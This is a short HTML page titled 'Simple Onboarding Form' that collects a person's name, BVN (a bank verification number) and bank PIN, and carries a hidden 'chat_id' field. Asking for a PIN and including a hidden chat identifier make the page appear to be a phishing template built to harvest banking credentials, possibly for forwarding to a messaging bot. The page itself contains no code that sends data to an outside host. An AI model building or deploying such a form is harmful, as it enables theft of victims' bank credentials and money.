<!DOCTYPE html>
<html>
<head>
    <title>Simple Onboarding Form</title>
</head>
<body>
    <h2>Simple Onboarding Form</h2>
    <form action="/onboard" method="POST">
        <input name="first_name" placeholder="First Name" required>
        <input name="last_name" placeholder="Last Name" required>
        <input name="bvn" placeholder="BVN" required>
        <input name="pin" placeholder="PIN" required>
        <input type="hidden" name="chat_id" value="123456789">
        <button type="submit">Submit</button>
    </form>
</body>
</html>
